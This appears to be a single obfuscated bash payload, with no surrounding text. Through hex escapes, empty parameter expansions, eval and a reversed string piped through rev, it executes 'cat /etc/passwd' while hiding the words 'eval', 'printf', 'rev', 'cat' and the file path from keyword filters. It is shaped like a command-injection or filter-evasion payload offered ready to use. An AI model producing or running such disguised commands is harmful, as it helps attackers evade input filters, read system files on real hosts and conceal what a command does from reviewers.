e""v$'a\x6c'  "$(    "${@%%.}"p$'\x72'\intf  %s 'dwssap/cte/ tac' |  ${*,,}  $'\x72'e${*//\"k}v  ${@,} )" 
